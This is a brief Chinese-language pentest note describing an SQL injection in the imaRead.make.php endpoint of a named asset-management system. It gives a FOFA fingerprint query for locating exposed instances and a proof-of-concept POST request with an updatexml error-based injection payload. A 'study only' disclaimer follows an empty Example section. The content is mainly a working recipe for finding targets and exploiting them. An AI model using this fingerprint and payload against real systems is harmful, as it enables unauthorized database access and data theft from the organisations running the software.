# -
渗透项目/渗透工具/脚本文件
适用于：易云资管系统的imaRead.make.php接口存在SQL注入

FOFA:
  body="不要着急，点此"

POC：
  POST /adminx/imaRead.make.php?act=remake HTTP/1.1
feeItem[]=1+AND+updatexml(1,concat(0x7e,md5(12345678)),1)

Example:（##免责声明：仅用于科学上网绿色实验健康学习##）
  
